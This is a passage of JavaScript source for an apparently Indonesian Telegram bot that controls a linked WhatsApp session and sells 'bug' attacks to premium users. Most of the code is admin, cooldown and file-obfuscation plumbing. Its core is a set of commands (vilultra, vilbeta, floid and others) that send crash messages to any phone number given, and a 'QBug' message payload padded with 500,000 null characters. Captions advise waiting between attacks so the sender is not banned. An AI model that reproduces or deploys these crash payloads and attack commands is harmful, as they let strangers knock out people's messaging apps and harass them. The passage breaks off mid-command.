┃  │ 𖠂 𝙁𝙄𝙍𝙎𝙏 𝙉𝘼𝙈𝙀 : ${userInfo.first_name || 'Tidak ada nama depan'}
┃  │ 𖠂 𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀 : @${userInfo.username || 'Tidak ada username'}
┃  │ 𖠂 𝙐𝙎𝙀𝙍𝙇𝙄𝙉𝙆 : ${userLink}
┃  ╰────────────────────
┗━━━━━━━━━━━━━━━━━━
`);
  }
});
let botForGroup = false; // Set true untuk mengaktifkan di grup
let botForPrivateChat = false; // Set true untuk mengaktifkan di private chat

// Command untuk mengaktifkan bot di grup
bot.command('grouponly', (ctx) => {
  const userId = ctx.from.id.toString();

  if (userId !== OWNER_ID && !isAdmin(userId)) {
    return ctx.reply('❌ You are not authorized to use this command.');
  }

  botForGroup = true;
  botForPrivateChat = false;
  ctx.reply(`
╭──(  ✅ Success    ) 
│ Bot diatur untuk hanya merespon di Grup!
│ Dev : @Zyrexoffc
╰━━━ㅡ━━━━━ㅡ━━━━━━⬣`);
});
const checkChatType = (ctx, next) => {
  if (botForGroup && ctx.chat.type !== 'group' && ctx.chat.type !== 'supergroup') {
    ctx.reply(`𝙉𝙂𝘼𝙋𝘼𝙄𝙉 𝘿𝙄 𝙋𝙍𝙄𝙑𝙄𝙏𝙀 𝘾𝙃𝘼𝙏, 𝙈𝘼𝙐 𝘽𝙐𝙂 𝙃𝘼𝙍𝙐𝙎 𝘿𝙄 𝙂𝙍𝙐𝘽.`);
    return;
  }

  if (botForPrivateChat && ctx.chat.type !== 'private') {
    ctx.reply(`𝘾𝙊𝙈𝙈𝘼𝙉𝘿 𝙄𝙉𝙄 𝙃𝘼𝙉𝙔𝘼 𝘿𝘼𝙋𝘼𝙏 𝘿𝙄 𝙂𝙍𝙐𝘽 𝘼𝙅𝘼.`);
    return;
  }

  next(); // Melanjutkan ke handler berikutnya jika lolos pengecekan
};
bot.use((ctx, next) => {
  // Set variabel global untuk menentukan tipe bot
  botForGroup = true; // Hanya untuk grup
  botForPrivateChat = false; // Tidak untuk private chat

  // Gunakan middleware
  checkChatType(ctx, next);
});
// Command untuk menonaktifkan semua mode (universal)
bot.command('disablemodes', (ctx) => {
  const userId = ctx.from.id.toString();

  if (userId !== OWNER_ID && !isAdmin(userId)) {
    return ctx.reply('❌ You are not authorized to use this command.');
  }

  botForGroup = false;
  botForPrivateChat = false;
  ctx.reply(`
╭──(  ✅ Success    ) 
│ Semua mode dinonaktifkan. Bot akan merespon di semua tempat!
│ Dev : @Zyrexoffc
╰━━━ㅡ━━━━━ㅡ━━━━━━⬣`);
});
bot.command('addowner', (ctx) => {
    const userId = ctx.from.id.toString();

    // Cek apakah pengguna adalah Owner atau Admin
    if (userId !== OWNER_ID && !isAdmin(userId)) {
        return ctx.reply('❌ You are not authorized to use this command.');
    }

    const args = ctx.message.text.split(' ');
    if (args.length < 3) {
        return ctx.reply(`
┏━━━❰  𝙎𝘼𝙇𝘼𝙃 𝙂𝙊𝘽𝙇𝙊𝙆 ❱━━━
┣⟣ Format tidak valid!
┣⟣ Contoh: /addowner <user_id> <Durasi>
┣⟣ Durasi: 
┃  • 30d (30 hari)
┃  • 24h (24 jam)
┃  • 1m (1 bulan)
┗━━━━━━━━━━━━━━━
        `);
    }

    const targetUserId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply('❌ Invalid duration. It must be a number (in days).');
    }

    addCaywzzaja(targetUserId, duration);
    ctx.reply(`
┏━━━❰ 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 ❱━━━
┣⟣ User ID: ${targetUserId}
┣⟣ Durasi: ${duration}
┣⟣ Status: Berhasil ✅
├━━━『 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢 』━━━
┃ • Akses ke semua fitur owner 
┃ • Priority support
┃ • Unlimited penggunaan
┗━━━━━━━━━━━━━━━
    `);
});

// Command untuk menghapus owner (khusus Owner dan Admin)
bot.command('delowner', (ctx) => {
    const userId = ctx.from.id.toString();

    // Cek apakah pengguna adalah Owner atau Admin
    if (userId !== OWNER_ID && !isAdmin(userId)) {
        return ctx.reply('❌ You are not authorized to use this command.');
    }

    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.reply('❌ Usage: /delowner <user_id>');
    }

    const targetUserId = args[1];

    // Fungsi untuk menghapus owner
    const wasDeleted = removeCaywzzaja(targetUserId);

    if (wasDeleted) {
        ctx.reply(`✅ User ${targetUserId} owner access has been removed.`);
    } else {
        ctx.reply(`❌ Failed to remove owner access for user ${targetUserId}.`);
    }
});
// Contoh fungsi `removeCaywzzaja`
function removeCaywzzaja(userId) {
    console.log(`Removing TroubleMaker access for user: ${userId}`);
    return true; // Ubah sesuai hasil operasi
}

bot.command('troublefeature', (ctx) => {
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah caywzzaja
    if (!isCaywzzaja(userId)) {
        return ctx.reply('❌ This feature is for caywzzaja users only. Upgrade to reynz to use this command.');
    }

    // Logika untuk pengguna caywzzaja
    ctx.reply('🎉 Welcome to the caywzzaja-only feature! Enjoy exclusive benefits.');
});
const ADMINS_FILE = 'admins.json';
// Inisialisasi file admins.json
let admins = {};
if (fs.existsSync(ADMINS_FILE)) {
    admins = JSON.parse(fs.readFileSync(ADMINS_FILE, 'utf8'));
} else {
    fs.writeFileSync(ADMINS_FILE, JSON.stringify({}));
}

// Fungsi untuk mengecek apakah pengguna adalah admin
function isAdmin(userId) {
    return admins[userId];
}

// Fungsi untuk menambahkan admin
function addAdmin(userId) {
    admins[userId] = true;
    fs.writeFileSync(ADMINS_FILE, JSON.stringify(admins, null, 2));
}

// Fungsi untuk menghapus admin
function removeAdmin(userId) {
    if (admins[userId]) {
        delete admins[userId];
        fs.writeFileSync(ADMINS_FILE, JSON.stringify(admins, null, 2));
        return true;
    }
    return false;
}

// Command untuk menambahkan admin (hanya owner yang bisa melakukannya)
bot.command('addadmin', (ctx) => {
    const ownerId = ctx.from.id.toString();

    if (ownerId !== OWNER_ID) {
        return ctx.reply('❌ You are not authorized to use this command.');
    }

    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.reply(`
┏━━━❰  𝙎𝘼𝙇𝘼𝙃 𝙂𝙊𝘽𝙇𝙊𝙆 ❱━━━
┣⟣ Format tidak valid!
┣⟣ Contoh: /addadmin 123456789 
┗━━━━━━━━━━━━━━━
        `);
    }

    const targetUserId = args[1];

    if (isAdmin(targetUserId)) {
        return ctx.reply(`✅ User ${targetUserId} is already an admin.`);
    }

    addAdmin(targetUserId);
    ctx.reply(`
┏━━━❰ 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 ❱━━━
┣⟣ User ID: ${targetUserId}
┣⟣ Status: Berhasil ✅
├━━━『 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢 』━━━
┃ • Akses ke semua fitur admin
┃ • Priority support
┃ • Unlimited penggunaan
┗━━━━━━━━━━━━━━━
    `);
});

// Command untuk menghapus admin
bot.command('deladmin', (ctx) => {
    const ownerId = ctx.from.id.toString();

    if (ownerId !== OWNER_ID) {
        return ctx.reply('❌ You are not authorized to use this command.');
    }

    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.reply('❌ Usage: /deladmin <user_id>');
    }

    const targetUserId = args[1];

    if (!isAdmin(targetUserId)) {
        return ctx.reply(`❌ User ${targetUserId} is not an admin.`);
    }

    const wasRemoved = removeAdmin(targetUserId);
    if (wasRemoved) {
        ctx.reply(`✅ User ${targetUserId} has been removed from admins.`);
    } else {
        ctx.reply(`❌ Failed to remove admin ${targetUserId}.`);
    }
});
bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" "); // Ambil teks setelah perintah
  if (!text) {
    return ctx.reply("Masukkan teks! Contoh: /brat teksnya");
  }

  try {
    const stickerBuffer = await BratGenerator(`https://siputzx-bart.hf.space/?q=${encodeURIComponent(text)}`);
    await ctx.replyWithSticker(
      { source: stickerBuffer },
      {
        packname: global.packname || "PackName", // Ganti dengan packname global Anda
        author: global.author || "Author",     // Ganti dengan author global Anda
      }
    );
  } catch (error) {
    console.error(error);
    ctx.reply("❌ Terjadi kesalahan saat membuat stiker.");
  }
});
bot.command("dec", async (ctx) => {
    try {
        console.log(`Perintah diterima: /Decrypt dari pengguna: ${ctx.from.username || ctx.from.id}`);
        const replyMessage = ctx.message.reply_to_message;

        if (!replyMessage || !replyMessage.document || !replyMessage.document.file_name.endsWith('.js')) {
            return ctx.reply('😠 Silakan balas file .js untuk dienkripsi.');
        }

        const args = ctx.message.text.split(" "); // Split perintah untuk mengambil jumlah pengulangan
        const repeatCount = parseInt(args[1]) || 1; // Default adalah 1 jika tidak ada angka
        if (isNaN(repeatCount) || repeatCount < 1) {
            return ctx.reply('😠 Masukkan jumlah pengulangan yang valid. Contoh: /dec 2');
        }

        const fileId = replyMessage.document.file_id;
        const fileName = replyMessage.document.file_name;

        // Mengambil file dari Telegram
        const fileLink = await ctx.telegram.getFileLink(fileId);
        const response = await axios.get(fileLink.href, { responseType: 'arraybuffer' });
        let codeBuffer = Buffer.from(response.data);

        const decy = `./@dec${fileName}`;
        fs.writeFileSync(decy, codeBuffer, 'utf8');

        let data = fs.readFileSync(decy, 'utf8');
        const { webcrack } = await require('webcrack');

        ctx.reply(`⚡️ Memproses Decrypt Code sebanyak ${repeatCount} kali. . .`);
        
        // Lakukan proses dekripsi berulang
        let dec;
        for (let i = 0; i < repeatCount; i++) {
            dec = await webcrack(data);
            data = dec.code; // Update data untuk iterasi berikutnya
        }

        //console.log(dec.code);
        // Simpan hasil dekripsi
        const decryptedFilePath = `./@hardenc${fileName}`;
        fs.writeFileSync(decryptedFilePath, dec.code, 'utf8');

        await ctx.replyWithDocument(
            { source: decryptedFilePath, filename: `Dec_${fileName}` },
            { caption: `╭━━━「 ✅ SUKSES 」━━━⬣\n│ File berhasil Decrypt ${repeatCount} kali!\n│ @Zyrexoffc\n╰━━━━━━━━━━━━━━━━⬣` }
        );

        // Hapus file setelah selesai
        fs.unlinkSync(decryptedFilePath);
        fs.unlinkSync(decy);
    } catch (error) {
        console.log(error);
        ctx.reply('⚠️ Terjadi kesalahan saat memproses file.');
    }
});

bot.command('enc', async (ctx) => {
    try {
        console.log(`Perintah diterima: /Encrypt dari pengguna: ${ctx.from.username || ctx.from.id}`);
        const replyMessage = ctx.message.reply_to_message;

        if (!replyMessage || !replyMessage.document || !replyMessage.document.file_name.endsWith('.js')) {
            return ctx.reply('😠 Silakan balas file .js untuk dienkripsi.');
        }

        //const args = ctx.message.text.split(" "); // Split perintah untuk mengambil jumlah pengulangan
        //const repeatCount = parseInt(args[1]) || 1; // Default adalah 1 jika tidak ada angka
        /*
        if (isNaN(repeatCount) || repeatCount < 1) {
            return ctx.reply('😠 Masukkan jumlah pengulangan yang valid. Contoh: /dec 2');
        }*/

        const fileId = replyMessage.document.file_id;
        const fileName = replyMessage.document.file_name;
        
        const sentMessage = await ctx.reply(`⚡ Downloading Files . . .`);
        // Mengambil file dari Telegram
        const fileLink = await ctx.telegram.getFileLink(fileId);
        const response = await axios.get(fileLink.href, { responseType: 'arraybuffer' });
        let codeBuffer = Buffer.from(response.data);
        
        const obfuscateCode = require('./toolsobf');
        
        const decy = `./@enchard${fileName}`;
        fs.writeFileSync(decy, codeBuffer, 'utf8');

        let data = fs.readFileSync(decy, 'utf8');
        
        await ctx.telegram.editMessageText(
        ctx.chat.id,
        sentMessage.message_id,
         null,
         `⚡️ Memproses Encrypt Code . . .`
         );
        //ctx.reply(`⚡️ Memproses Encrypt Code . . .`);
        
        const obfuscationType = "obf9";       
        // Lakukan proses dekripsi berulang
        const obfuscatedCode = await obfuscateCode(data, obfuscationType);
                
        //console.log(dec.code);
        // Simpan hasil dekripsi
        const encryptedFilePath = `./@hardenc${fileName}`;
        fs.writeFileSync(encryptedFilePath, obfuscatedCode, 'utf8');

        await ctx.replyWithDocument(
            { source: encryptedFilePath, filename: `ENC_${fileName}` },
            { caption: `╭━━━「 ✅ SUKSES 」━━━⬣\n│ File berhasil Enc hard boy 😎\n│ @Zyrexoffc\n╰━━━━━━━━━━━━━━━━⬣` }
        );

        // Hapus file setelah selesai
        fs.unlinkSync(encryptedFilePath);
        fs.unlinkSync(decy);
    } catch (error) {
        console.log(error);
        ctx.reply('⚠️ Terjadi kesalahan saat memproses file.');
    }
});

// Command untuk melihat daftar admin
bot.command('listadmin', (ctx) => {
    const adminList = Object.keys(admins);

    if (adminList.length > 0) {
        const details = adminList.map((userId) => `- User ID: ${userId}`).join('\n');
        ctx.reply(`📋 𝙇𝙞𝙨𝙩 𝘼𝙙𝙢𝙞𝙣𝙨\n\n${details}`);
    } else {
        ctx.reply('❌ No admins found.');
    }
});
// Command untuk fitur khusus admin
bot.command('adminfeature', (ctx) => {
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah admin
    if (!isAdmin(userId)) {
        return ctx.reply('❌ This feature is for admins only. Contact the owner for access.');
    }

    // Logika untuk admin
    ctx.reply('🎉 Welcome to the admin-only feature! Enjoy exclusive benefits.');
});

const cooldowns2 = new Map();

// Durasi cooldown dalam milidetik (misal 10 detik)
const COOLDOWN_DURATION = 120000;

// Flag untuk mengaktifkan atau menonaktifkan cooldown
let isCooldownActive = true;

// Middleware untuk menerapkan mekanisme cooldown
const cooldownMiddleware = (ctx, next) => {
  const userId = ctx.from.id.toString(); // Get user ID

  // Check if user is the owner or an admin
  if (userId === OWNER_ID || isAdmin(userId)) {
    console.log(`User ${userId} is exempt from cooldown (admin or owner).`);
    return next(); // Allow command execution without cooldown
  }

  if (!isCooldownActive) {
    // If cooldown is disabled, continue without restriction
    return next();
  }

  // Check if user is in cooldown
  if (cooldowns2.has(userId)) {
    const remainingTime = ((cooldowns2.get(userId) + COOLDOWN_DURATION) - Date.now()) / 1000;
    return ctx.reply(`⏳ You must wait ${remainingTime.toFixed(1)} seconds before using this command again.`);
  }

  // Set the user in cooldown
  cooldowns2.set(userId, Date.now());
  
  // Remove user from cooldown after the specified duration
  setTimeout(() => cooldowns2.delete(userId), COOLDOWN_DURATION);

  // Proceed to the next handler
  return next();
};

// Command untuk mengatur status cooldown
bot.command('cdmurbug', (ctx) => {
  const args = ctx.message.text.split(' ')[1]?.toLowerCase(); // Ambil argumen setelah command
     const userId = ctx.from.id;
 const ownerId = ctx.from.id.toString();
    // Cek apakah pengguna adalah owner atau memiliki akses caywzzaja
    if (ownerId !== OWNER_ID && !isCaywzzaja(userId)) {
        return ctx.reply('❌ You are not authorized to use this command.');
    }    
  if (args === 'true') {
    isCooldownActive = true;
    ctx.reply('✅ Cooldown diaktifkan.');
  } else if (args === 'false') {
    isCooldownActive = false;
    ctx.reply('❌ Cooldown dinonaktifkan.');
  } else {
    ctx.reply('⚙️ Gunakan /cdmurbug true untuk mengaktifkan atau /cdmurbug false untuk menonaktifkan.');
  }
});
const process = require('process');

/*
// Ganti dengan token GitHub yang kamu punya (jaga kerahasiaannya)'
const REPO_OWNER2 = 'caywzzajabang'; // Ganti dengan pemilik repository
const REPO_NAME2 = 'maintance'; // Ganti dengan nama repo
const FILE_PATH2 = 'new'; // Path file yang berisi status pemeliharaan

// URL API GitHub untuk mendapatkan raw content file dengan otentikasi
const MAINTENANCE_STATUS_URL = `https://api.github.com/repos/${REPO_OWNER2}/${REPO_NAME2}/contents/${FILE_PATH2}?ref=main`;

// Variabel untuk menyimpan status pemeliharaan
let isMaintenanceMode = false;

// Fungsi untuk memuat status pemeliharaan dari GitHub menggunakan token
const loadMaintenanceStatus = async () => {
  try {
    const response = await axios.get(MAINTENANCE_STATUS_URL, {
      headers: {
        'Authorization': `token ${GITHUB_TOKEN}`
      }
    });

    // Mengambil content file dan mendekodekan dari base64
    const fileContent = Buffer.from(response.data.content, 'base64').toString('utf-8');
    
    // Mengasumsikan file berisi JSON dengan status pemeliharaan
    const parsedData = JSON.parse(fileContent);
    isMaintenanceMode = parsedData.maintenance;
    console.log(chalk.bgMagenta('Haii :D'));
  } catch (error) {
    console.error('Gagal memuat status pemeliharaan:', error);
    spamError();
    process.exit(1);  // Keluar dari proses jika error
  }
};
*/

// Fungsi untuk spam console log error
const spamError = () => {
  setInterval(() => {
    console.error(chalk.bgRed('ERROR: 😜 BELI ORI MAKANYA'));
  }, 1000); // Spam setiap 1 detik
};

// Muat status pemeliharaan saat bot dimulai
//loadMaintenanceStatus();

// Middleware pemeliharaan (contoh penggunaan dengan bot)
/*bot.use((ctx, next) => {
  if (isMaintenanceMode) {
    ctx.reply('Maaf, Script Sepertinya Di Sebar Seseorang Maka Owner Mengerrorkan script ini.');
  } else {
    return next();
  }
});
*/

// Gunakan middleware cooldown untuk command tertentu
bot.command('bokep', cooldownMiddleware, (ctx) => {
  ctx.reply('jangan spam.');
});
// Fungsi untuk mengirim pesan saat proses
const prosesrespone = (target, ctx) => {
    const VideoUrl = 'https://files.catbox.moe/i4185s.mp4'; // Ganti dengan URL gambar lain jika diperlukan
    const senderName = ctx.message.from.first_name || ctx.message.from.username || "Pengguna"; // Mengambil nama peminta dari konteks
    const date = new Date().toLocaleString("id-ID", { 
        weekday: 'long', 
        year: 'numeric', 
        month: 'long', 
        day: 'numeric', 
        hour: '2-digit', 
        minute: '2-digit', 
        second: '2-digit' 
    }); // Format tanggal sesuai lokal Indonesia
    const caption = `
「 ✅ 𝘽𝙪𝙜 𝙂𝙖𝙣𝙖𝙨 𝙎𝙚𝙣𝙙 𝙏𝙤 𝙋𝙧𝙤𝙘𝙘𝙚𝙨 」
┏━━━━━━━━━━━━━━━━━━━━━━━━❍
┃╭────────────────────
┃│ 𝙋𝙚𝙢𝙞𝙣𝙩𝙖 : ${senderName}
┃│ 𝙏𝙖𝙧𝙜𝙚𝙩 : ${target} 
┃│ 𝙈𝙤𝙙𝙚 : Ganas 🔥
┃│ 𝙏𝙖𝙣𝙜𝙜𝙖𝙡 : ${date}
┃│ 𝘿𝙚𝙫 𝙎𝙘 : @Zyrexoffc
┃╰────────────────────
┗━━━━━━━━━━━━━━━━━━━━━━━❍
𝙎𝙪𝙙𝙖𝙝 𝘽𝙪𝙜 𝙏𝙤𝙡𝙤𝙣𝙜 𝙅𝙚𝙙𝙖 5-10 𝙈𝙚𝙣𝙞𝙩𝙖𝙣, 𝘽𝙞𝙖𝙧 𝙎𝙚𝙣𝙙𝙚𝙧 𝘽𝙪𝙜 𝙏𝙞𝙙𝙖𝙠 𝙆𝙚𝙣𝙤𝙣.`;
    const keyboard = [
        [
            {
                text: "𝘽𝙖𝙘𝙠 𝙏𝙤 𝘽𝙪𝙜𝙈𝙚𝙣𝙪",
                callback_data: "option1"
            },
            {
                text: "𝘽𝙖𝙘𝙠 𝙏𝙤 𝘽𝙪𝙜𝙈𝙚𝙣𝙪",
                callback_data: "Bugmenu2"
            }
        ]
    ];

    // Mengirim gambar dengan caption dan inline keyboard
    ctx.replyWithVideo(getRandomVideo(), {
        caption: caption,
        reply_markup: {
            inline_keyboard: keyboard
        }
    }).then(() => {
        console.log('Proses response sent');
    }).catch((error) => {
        console.error('Error sending process response:', error);
    });
};

// Fungsi untuk mengirim pesan saat proses selesai
const donerespone = (target, ctx) => {
    const VideoUrl = 'https://files.catbox.moe/i4185s.mp4'; // Ganti dengan URL gambar lain jika diperlukan
    const senderName = ctx.message.from.first_name || ctx.message.from.username || "Pengguna"; // Mengambil nama peminta dari konteks
    const date = new Date().toLocaleString("id-ID", { 
        weekday: 'long', 
        year: 'numeric', 
        month: 'long', 
        day: 'numeric', 
        hour: '2-digit', 
        minute: '2-digit', 
        second: '2-digit' 
    }); // Format tanggal sesuai lokal Indonesia
    const caption = `
「 ✅ 𝘽𝙪𝙜 𝙂𝙖𝙣𝙖𝙨 𝙎𝙚𝙣𝙙 𝙏𝙤 𝙎𝙪𝙘𝙘𝙚𝙨 」
┏━━━━━━━━━━━━━━━━━━━━━━━━❍
┃╭────────────────────
┃│ 𝙋𝙚𝙢𝙞𝙣𝙩𝙖 : ${senderName}
┃│ 𝙏𝙖𝙧𝙜𝙚𝙩 : ${target} 
┃│ 𝙈𝙤𝙙𝙚 : Ganas 🔥
┃│ 𝙏𝙖𝙣𝙜𝙜𝙖𝙡 : ${date}
┃│ 𝘿𝙚𝙫 𝙎𝙘 : @Zyrexoffc
┃╰────────────────────
┗━━━━━━━━━━━━━━━━━━━━━━━❍
𝙎𝙪𝙙𝙖𝙝 𝘽𝙪𝙜 𝙏𝙤𝙡𝙤𝙣𝙜 𝙅𝙚𝙙𝙖 5-10 𝙈𝙚𝙣𝙞𝙩𝙖𝙣, 𝘽𝙞𝙖𝙧 𝙎𝙚𝙣𝙙𝙚𝙧 𝘽𝙪𝙜 𝙏𝙞𝙙𝙖𝙠 𝙆𝙚𝙣𝙤𝙣.`;
    const keyboard = [
        [
            {
                text: "𝘽𝙖𝙘𝙠 𝙏𝙤 𝘽𝙪𝙜𝙈𝙚𝙣𝙪",
                callback_data: "option1"
            },
            {
                text: "𝘽𝙖𝙘𝙠 𝙏𝙤 𝘽𝙪𝙜𝙈𝙚𝙣𝙪2",
                callback_data: "Bugmenu2"
            }
        ]
    ];

    // Mengirim gambar dengan caption dan inline keyboard
ctx.replyWithVideo(getRandomVideo(), {
        caption: caption,
        reply_markup: {
            inline_keyboard: keyboard
        }
    }).then(() => {
        console.log('Done response sent');
    }).catch((error) => {
        console.error('Error sending done response:', error);
    });
};
const kirimpesan = async (number, message) => {
  try {
    const target = `${number}@s.whatsapp.net`;
    await cay.sendMessage(target, {
      text: message
    });
    console.log(`Pesan dikirim ke ${number}: ${message}`);
  } catch (error) {
    console.error(`Gagal mengirim pesan ke WhatsApp (${number}):`, error.message);
  }
};

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply(`
┏━━━❰ 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋 ❱━━━
┃ 𝙒𝙝𝙖𝙩𝙨𝙖𝙥𝙥 𝘽𝙚𝙡𝙪𝙢 𝙏𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜
┃ 𝙎𝙞𝙡𝙖𝙝 𝙆𝙖𝙣 𝙋𝙖𝙞𝙧𝙞𝙣𝙜 𝙆𝙤𝙙𝙚 
┃ 𝘽𝙖𝙧𝙪 𝘽𝙞𝙨𝙖 𝙈𝙚𝙢𝙖𝙠𝙖𝙞 𝘽𝙪𝙜. 
┗━━━━━━━━━━━━━
`);
    return;
  }
  next();
};
const QBug = {
  key: {
    remoteJid: "p",
    fromMe: false,
    participant: "0@s.whatsapp.net"
  },
  message: {
    interactiveResponseMessage: {
      body: {
        text: "Sent",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\0".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
        version: 3
      }
    }
  }
};
bot.command("vilultra", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply(`
╭═══════『 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝 』═══════⊱
│
├─────『 𝐈𝐧𝐟𝐨 』
│ • Status: Not Premium ❌
│ • Upgrade ke premium untuk
│   menggunakan fitur ini
│
╰═════════════════════⊱
        `);
    }
  if (!q) {
    return ctx.reply(`
┏━━━❰ 𝙎𝘼𝙇𝘼𝙃 𝙂𝙊𝘽𝙇𝙊𝙆 ❱━━━
┣⟣ Masukkan nomor target!
┣⟣ Contoh: /vilultra 62xxx
┗━━━━━━━━━━━━━━━
    `);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";


  // Melakukan proses freezing 50 kali
  for (let i = 0; i < 1; i++) {
      await sal_blank(target);
      await villaincrash(target);
      }
  
          // Menyelesaikan proses response
  await donerespone(target, ctx);
});
bot.command("vilbeta", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply(`
╭═══════『 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝 』═══════⊱
│
├─────『 𝐈𝐧𝐟𝐨 』
│ • Status: Not Premium ❌
│ • Upgrade ke premium untuk
│   menggunakan fitur ini
│
╰═════════════════════⊱
        `);
    }
  if (!q) {
    return ctx.reply(`
┏━━━❰ 𝙎𝘼𝙇𝘼𝙃 𝙂𝙊𝘽𝙇𝙊𝙆 ❱━━━
┣⟣ Masukkan nomor target!
┣⟣ Contoh: /vilbeta 62xxx
┗━━━━━━━━━━━━━━━
    `);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Proses response pertama
  await prosesrespone(target, ctx);


  // Melakukan proses freezing 50 kali
  for (let i = 0; i < 1; i++) {
      await sal_blank(target);
      await villaincrash(target);
      }

  // Menyelesaikan proses response
  await donerespone(target, ctx);
});
bot.command("floid", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply(`
╭═══════『 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝 』═══════⊱
│
├─────『 𝐈𝐧𝐟𝐨 』
│ • Status: Not Premium ❌
│ • Upgrade ke premium untuk
│   menggunakan fitur ini
│
╰═════════════════════⊱
        `);
    }
  if (!q) {
    return ctx.reply(`
┏━━━❰ 𝙎𝘼𝙇𝘼𝙃 𝙂𝙊𝘽𝙇𝙊𝙆 ❱━━━
┣⟣ Masukkan nomor target!
┣⟣ Contoh: /floid 62xxx
┗━━━━━━━━━━━━━━━
    `);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Proses response pertama
  await prosesrespone(target, ctx);

  // Melakukan proses freezing 50 kali
  for (let i = 0; i < 1; i++) {
      await sal_blank(target);
      await villaincrash(target);
      }

  // Menyelesaikan proses response
  await donerespone(target, ctx);
});
bot.command("vilmeta", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply(`
╭═══════『 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝 』═══════⊱
│
├─────『 𝐈𝐧𝐟𝐨 』
│ • Status: Not Premium ❌
│ • Upgrade ke premium untuk
│   menggunakan fitur ini
│
╰═════════════════════⊱
        `);
    }
  if (!q) {
    return ctx.reply(`
┏━━━❰ 𝙎𝘼𝙇𝘼𝙃 𝙂𝙊𝘽𝙇𝙊𝙆 ❱━━━
┣⟣ Masukkan nomor target!
┣⟣ Contoh: /vilmeta 62xxx
┗━━━━━━━━━━━━━━━
    `);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Proses response pertama
  await prosesrespone(target, ctx);


  // Melakukan proses freezing 50 kali
  for (let i = 0; i < 1; i++) {
      await sal_blank(target);
      await villaincrash(target);
      }
      
  // Menyelesaikan proses response
  await donerespone(target, ctx);
});
bot.command("vilglich", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply(`
╭═══════『 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝 』═══════⊱
│
├─────『 𝐈𝐧𝐟𝐨 』
│ • Status: Not Premium ❌
│ • Upgrade ke premium untuk
│   menggunakan fitur ini
│
╰═════════════════════⊱
        `);
    }
  if (!q) {
    return ctx.reply(`
┏━━━❰ 𝙎𝘼𝙇𝘼𝙃 𝙂𝙊𝘽𝙇𝙊𝙆 ❱━━━
┣⟣ Masukkan nomor target!
┣⟣ Contoh: /vilglich 62xxx
┗━━━━━━━━━━━━━━━
    `);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Proses response pertama
  await prosesrespone(target, ctx);


  // Melakukan proses freezing 50 kali
  for (let i = 0; i < 1; i++) {
      await sal_blank(target);
      await villaincrash(target);
      }

  // Menyelesaikan proses response
  await donerespone(target, ctx);
});
bot.command("vilcrash", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply(`
╭═══════『 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝 』═══════⊱
│
├─────『 𝐈𝐧𝐟𝐨 』
│ • Status: Not Premium ❌
